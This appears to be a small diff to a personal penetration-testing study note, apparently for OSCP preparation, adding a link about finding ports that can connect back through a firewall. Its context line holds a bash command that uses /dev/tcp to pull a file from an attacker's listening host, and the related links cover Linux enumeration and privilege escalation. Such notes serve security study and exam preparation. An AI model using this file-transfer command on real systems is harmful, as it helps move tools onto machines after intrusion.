@@ -9,6 +9,7 @@ bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
 
 # Related
 
+- [20221003151258](/zet/20221003151258/README.md) scan for ports to connect back on through firewall
 - [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
 - [20221003150907](/zet/20221003150907/README.md) linux enumeration quick commands transfer / download files with just bash
 - ~/kb/hacking/priv-esc/enumeration-quick-commands.md
